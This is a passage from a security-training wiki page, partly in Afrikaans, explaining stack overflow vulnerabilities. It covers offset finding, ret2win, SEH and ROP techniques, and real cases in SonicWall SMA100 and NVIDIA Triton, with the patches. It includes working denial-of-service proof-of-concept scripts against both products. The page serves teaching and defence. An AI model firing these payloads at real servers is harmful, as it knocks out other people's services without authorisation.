# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Wat is 'n Stack Overflow

A **stack overflow** is a vulnerability that occurs when a program writes more data to the stack than it is allocated to hold. This excess data will **oorskryf aangrensende geheuerruimte**, leading to the corruption of valid data, control flow disruption, and potentially the execution of malicious code. This issue often arises due to the use of unsafe functions that do not perform bounds checking on input.

Die hoofprobleem van hierdie oorskrywing is dat die **gestoorde instruksie-aanwyser (EIP/RIP)** en die **gestoorde basis-aanwyser (EBP/RBP)** om na die vorige funksie terug te keer, **op die stack gestoor** word. Daarom kan 'n aanvaller hierdie waardes oorskryf en die **uitvoeringsvloei van die program beheer**.

Die kwesbaarheid ontstaan gewoonlik omdat 'n funksie **op die stack meer bytes kopieer as wat daarvoor toegewys is**, en gevolglik ander dele van die stack kan oorskryf.

Party algemene funksies wat vatbaar hiervoor is: **`strcpy`, `strcat`, `sprintf`, `gets`**... Ook funksies soos **`fgets`**, **`read`** & **`memcpy`** wat 'n **lengte-argument** aanvaar, kan op 'n kwesbare wyse gebruik word as die gespesifiseerde lengte groter is as die toegewysde een.

Byvoorbeeld, die volgende funksies kan kwesbaar wees:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Vind offsets van Stack Overflows

Die algemeenste manier om stack overflows te vind is om 'n baie groot invoer van `A`s te gee (bv. `python3 -c 'print("A"*1000)'`) en 'n `Segmentation Fault` te verwag wat aandui dat die **adres `0x41414141` probeer gekry is**.

Verder, sodra jy gevind het dat daar 'n Stack Overflow vulnerability is, sal jy die offset moet bepaal totdat dit moontlik is om die **return address te overwrite**; hiervoor word gewoonlik 'n **De Bruijn sequence** gebruik. Vir 'n gegewe alfabet van grootte _k_ en subreeksse van lengte _n_ is dit 'n **sikliese volgorde waarin elke moontlike subreeks van lengte _n_ presies een keer as 'n aaneenlopende subreeks voorkom**.

Op hierdie manier, in plaas daarvan om met die hand uit te werk watter offset nodig is om die EIP te beheer, kan jy een van hierdie sequences as padding gebruik en dan die offset vind van die bytes wat dit uiteindelik overwrite het.

Dit is moontlik om **pwntools** hiervoor te gebruik:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
of **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Uitbuiting van Stack Overflows

Tydens 'n overflow (aanneem die overflow-grootte is groot genoeg) sal jy in staat wees om waardes van plaaslike veranderlikes binne die stack te **overwrite** totdat jy die gestoorde **EBP/RBP and EIP/RIP (or even more)** bereik.\  
Die mees algemene manier om hierdie tipe kwetsbaarheid te misbruik is deur die **return address** te wysig sodat wanneer die funksie eindig die **control flow** herlei sal word na waar die gebruiker in hierdie pointer gespesifiseer het.

In ander scenario's mag dit egter genoeg wees om net sekere veranderlikewaardes op die stack te **overwrite** (like in easy CTF challenges).

### Ret2win

In hierdie tipe CTF challenges is daar 'n **function** **inside** die binary wat **never called** word en wat **you need to call in order to win**. Vir hierdie challenges hoef jy net die **offset to overwrite the return address** te vind en die **address of the function** om aan te roep (gewoonlik sal [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) gedeaktiveer wees) sodat wanneer die vulnerable function returns, die hidden function aangeroep sal word:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

In hierdie scenario kan die aanvaller 'n shellcode op die stack plaas en die beheerste EIP/RIP misbruik om na die shellcode te jump en arbitrary code uit te voer:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

Op 32-bit Windows kan 'n overflow die Structured Exception Handler (SEH) ketting overskryf in plaas van die gestoorde return address. Eksploitasie vervang tipies die SEH pointer met 'n POP POP RET gadget en gebruik die 4-byte nSEH veld vir 'n kort jump om terug te pivot in die groot buffer waar die shellcode lê. 'n Algemene patroon is 'n kort jmp in nSEH wat op 'n 5-byte near jmp land wat net voor nSEH geplaas is om honderde bytes terug na die payload-begin te jump.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

Hierdie tegniek is die fundamentele raamwerk om die hoofbeskerming teen die vorige tegniek te omseil: **No executable stack (NX)**. Dit laat ook toe om verskeie ander tegnieke uit te voer (ret2lib, ret2syscall...) wat uiteindelik arbitrary commands sal uitvoer deur bestaande instruksies in die binary te misbruik:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

' n Overflow gaan nie altyd in die stack plaasvind nie; dit kan byvoorbeeld ook in die **heap** wees:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Tipes beskerming

Daar is verskeie beskermings wat probeer voorkom dat kwesbaarhede geëksploiteer word; kyk daarna in:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

'n Goeie demonstrasie van waarom **`sscanf` moet nooit vertrou word vir die parse van onbetroubare input nie** het in 2025 in SonicWall’s SMA100 SSL-VPN appliance voorgekom. Die kwesbare roetine binne `/usr/src/EasyAccess/bin/httpd` probeer die version en endpoint uit enige URI onttrek wat met `/__api__/` begin:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. Die eerste omskakeling (`%2s`) stoor veilig **twee** bytes in `version` (bv. `"v1"`).
2. Die tweede omskakeling (`%s`) **het geen lengte-spesifiseerder nie**, daarom sal `sscanf` aanhou kopieer **tot by die eerste NUL byte**.
3. Omdat `endpoint` op die **stack** geleë is en **0x800 bytes long**, veroorsaak 'n pad langer as 0x800 bytes dat alles wat ná die buffer lê korrupteer word ‑ insluitend die **stack canary** en die **saved return address**.

Een enkele reël proof-of-concept is genoeg om die crash **before authentication** te trigger:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Even though stack canaries abort the process, an attacker still gains a **Denial-of-Service** primitive (and, with additional information leaks, possibly code-execution). Die les is eenvoudig:

* Verskaf altyd 'n **maksimum veldwydte** (bv. `%511s`).
* Gebruik verkieslik veiliger alternatiewe soos `snprintf`/`strncpy_s`.

### Werklike voorbeeld: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA’s Triton Inference Server (≤ v25.06) het verskeie **stack-based overflows** gehad wat deur sy HTTP API bereikbaar was.
Die kwesbare patroon het herhaaldelik verskyn in `http_server.cc` en `sagemaker_server.cc`:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) gee die **aantal interne buffer-segmente** wat die huidige HTTP versoekliggaam saamstel.
2. Elke segment veroorsaak dat 'n **16-byte** `evbuffer_iovec` op die **stack** via `alloca()` toegeken word – **sonder enige boonste grens**.
3. Deur **HTTP _chunked transfer-encoding_** te misbruik, kan 'n kliënt die versoek dwing om in **honderde-duisende 6-byte-stukke** (`"1\r\nA\r\n"`) gesplit te word. Dit laat `n` onbeperk groei totdat die **stack** uitgeput is.

#### Bewys van konsep (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
'n ~3 MB versoek is genoeg om die gestoorde return address te oorskryf en die daemon op 'n standaard build te **crash**.

#### Patch & Versagting
Die 25.07 release vervang die onveilige stack allocation met 'n **heap-backed `std::vector`** en hanteer `std::bad_alloc` op 'n elegante wyse:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Lesse geleer:
* Moet nooit `alloca()` met attacker-controlled sizes aanroep nie.
* Chunked requests kan die vorm van server-side buffers drasties verander.
* Valideer / beperk enige waarde wat vanaf client input afgelei is *voordat* dit in memory allocations gebruik word.

## Verwysings
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
